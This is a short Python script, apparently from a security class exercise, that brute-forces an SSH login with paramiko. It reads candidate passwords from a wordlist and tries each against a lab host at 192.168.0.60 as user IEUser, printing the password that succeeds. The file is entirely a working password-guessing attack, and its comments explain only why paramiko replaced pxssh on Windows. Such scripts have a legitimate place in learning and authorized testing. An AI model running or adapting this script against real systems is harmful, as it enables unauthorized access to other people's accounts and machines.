#!/usr/bin/env python3
import time
import paramiko
import smtplib

# import paramiko for SSH network connections which was different than what we used in class with the brute force challenge that used "from pexpect import pxssh" 
# pexpect didn't work when being ran in windows and I needed to find a different tool to be able to run it in Windows OS , so this is why I went with "import paramiko"

 


def brute():
    filepath=open("./passwordlist.txt")
    ssh=paramiko.SSHClient()
    for i in filepath.readlines():
        secret=i.strip("\n")
        try:
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect('192.168.0.60', username="IEUser", password=secret)
            return secret

        except:
            time.sleep(1)
            print(secret)
    


def main():
    password=brute()
    print("This is your password    " + password)

main()
